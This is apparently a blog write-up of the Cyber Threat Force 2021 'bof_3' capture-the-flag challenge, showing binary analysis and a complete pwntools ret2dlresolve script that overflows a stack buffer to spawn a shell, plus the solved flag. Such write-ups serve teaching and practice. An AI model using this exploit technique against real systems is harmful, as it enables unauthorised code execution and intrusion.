---
title: "Writeup Cyber Threat Force : bof_3"
date: 2021-07-08T02:12:09+01:00
draft: false
tags: ["blog", "security", "ctf", "cyber-threat-force", "pwn"]
type: "posts"
showDate: true
---

For this challenge, we also were given a service executable. It was hosted remotely.

NOTE: since I'm writting this after the CTF ended, the demos are done locally.

```bash
$ checksec ./service
[*] '/home/vivescere/ctf/bof_3/service'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

$ ./service
password: 
mypassword
nop
```

NX enabled, and partial RELRO. Let's take a look at the binary using Ghidra:

```c
undefined4 main(void) {
  ignorMe(&stack0x00000004);
  puts("password: ");
  vuln();
  puts("nop");
  return 0;
}

void vuln(void) {
  undefined local_70 [104];
  
  read(0,local_70,0x96);
  return;
}
```

We have an overflow, but not much else going on. We won't be able to leak an address from the libc using a format string exploit, like on [the last challenge](/blog/writeup-cyber-threat-force-2021-pwn-bof-2).

We can try the [ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve) technique. Pwntools even has a nice module for it.

I found the offset using `cyclic` from pwntools.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./service")

context.binary = exe
context.terminal = ['konsole', '-e']

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote('XXX.XXX.XXX.XXX', 00000)

    return r

def main():
    r = conn()
    r.recvuntil(':')
    r.recvline()
    
    offset = 112

    rop = ROP(exe)
    dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
    rop.read(0, dlresolve.data_addr)
    rop.ret2dlresolve(dlresolve)
    raw_rop = rop.chain()

    r.sendline(flat({offset: bytes(rop)}))
    r.sendline(dlresolve.payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

```bash
$ python solve.py LOCAL
[*] '/home/vivescere/ctf/bof_3/service'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/vivescere/ctf/bof_3/service': pid 846530
[*] Loaded 10 cached gadgets for './service'
[*] Switching to interactive mode
$ pwd
/home/vivescere/ctf/bof_3
```

The flag is `CYBERTF{Zeroleak@nd_bruteF0rc3}`. It was in `/home/ctf/flag.txt`.

You can [view the sources on github](https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof3) or [read other writeups](/blog/cyber-threat-force-ctf/).
